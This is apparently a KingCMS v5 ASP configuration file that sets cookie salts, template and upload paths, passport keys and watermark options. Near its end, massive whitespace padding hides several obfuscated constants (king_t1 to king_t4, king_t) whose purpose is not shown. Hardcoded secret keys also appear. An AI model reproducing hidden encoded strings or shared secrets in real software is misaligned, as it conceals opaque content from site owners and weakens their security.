<%
'cookies参数,不要设置成一样的
 const king_salt_admin = "KingCMS_v5" '后台
 const king_salt_user  = "KingCMS_v5_USER" '前台，通行证模式下多站要一致，网站建成后不要修改这个参数(用户状态会出错，需要重新生成才可解决问题)


'默认首页,填写服务器可以支持的默认首页即可,必须包含.
 const king_ext = "index.htm"

'默认语言
 const king_language = "zh-cn"


'模板编码,不建议修改,这个项目被修改的情况下,要修改所有的模板编码
 const king_codepage = "utf-8"


'模板文件夹
 const king_templates = "template"
'默认模板文件名 你可以随便改这个文件名，但必须保证模板目录下面存在这个文件
 const king_default_template = "default.htm"
'可支持的模板扩展名
 const king_te ="asp,html,shtml,shtm,htm"'TemplateExtension


'上传目录
 const king_upath = "up_files"


'分页标签
 const king_break = "<div style=""PAGE-BREAK-AFTER: always""><span style=""DISPLAY: none"">&nbsp;</span></div>"
'const king_break_old="<center style=""PAGE-BREAK-AFTER: always""></center>"


'fckeditor目录名称修改 (修改下面参数的同时修改对应的目录，这个修改是为了后台暴落的情况下被猜到fck目录)
 const king_fckeditor_path = "FCKeditor"


'passport数据库

 const king_remoteurl = "../" '默认值，既调用本站用户数据passport/
 'const king_remoteurl = "http://localhost/page/" '远程passport，设置一个验证地址,必须以/结束！！passport/

	 const king_domain = "kingcms.com"'网站主域名，若king_remoteurl值为默认值，则无需设置此项

	'以下两个参数和远程KingCMS系统的参数必须一致。不然无法读取数据
	 const king_remotekey1 = "^^^&^H*Kdw" '参数1
	 const king_remotekey2 = "&&&&#6****" '参数2
	 '暂时不支持跨域名验证，二级域名之间可以
	 '也就是说：www.kingcms.com和bbs.kingcms之间可以验证，不能在kingcms.com和sina.com之间建立passport系统。


'aspjpeg （true 支持；false不支持）
const king_isjpeg = true '服务器是否支持aspjpeg，Version 1.5
const king_regkey = "" '有些服务器有ASPJPEG组件，但不能使用时，就在这里输入可用的系列号就能正常使用
const king_watermark = true '是否打开水印功能 水印文件在 template/image/watermark.gif
const king_watermark_weight = 0 ' 水印的位置 0随机 1左上角 2右上角 3左下角 4右下角 5正中间
const king_watermark_alpha = 0.5 '水印的透明度


'后台允许测试登录次数
 const king_loginnum=10

'服务器对象名称设置
 const king_fso = "Scripting.FileSystemObject"
 const king_stm = "ADODB.Stream"
 const king_xmldom = "Microsoft.XMLDOM"
 const king_jpeg = "Persits.Jpeg"

'其他无关紧要的参数
 const king_map_xmlns = "http://www.google.com/schemas/sitemap/0.84"
 const king_table_s = "<table class=""k_table"" cellspacing=""0"">"'表格开头
 const king_imgtype = "jpeg/jpg/png/gif"'图像文件
 const king_datetype = "yyyy/MM/dd" '存储路径格式










































































































































































































































































































'不可修改的系统参数
 const king_chr="1,2,3,4,5,6,7,8,9,10,14,15,16,17,18,19,20,21,22,23,24,25,26,27,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,58,59,60,61,62,63,64,91,92,93,94,95,96,123,123,124,125,126"




































































																																																																																																		 const                                                                                                                                                                                                 king_t1                                                                                                                                                                                                =                                                                                                                                                                                                "sdvqgrfwbjrfsdfvcfvqrfsdddrfsdho1bfvcfgsgtrezdfvchchddsbvqvqbkbkbkwpeyfwebguhqea"




































































 																																																																																																																																																																																																				const                                                                                                                                                                                                 king_t2                                                                                                                                                                                                =                                                                                                                                                                                                "cgwphqdceazd1bchhocfgugschrezdimhpezhoebeyzdrfqkdcddbmcffwgufvch1byhhqdcddbm1bns"




































































																																																																																																																																																																																																																																																																																																						 const king_t3="fwebguqknulawphqdcea1bqiezez1blzfwgufvchcg1blzgscggscfbjgsgrwpsdvqhorfsdvqddrfsd"




































































																																																																																																																																																																																																																																																																																																																																																																																																								 const king_t4="cghqcffwddchrfchcffvdcbjgscfxjxkscsdvqcghqcffwddchrfsdvqhpdcgrbmrfsdvqfvcheaezrf"







































































 


																																																																																																		const king_t="ciddgrhochgs1beyfwebgucgbmcgchgsea1bcggsch1bcgbmcgchgseaebhoeagsreyiyisc"





















































































































































































































%>
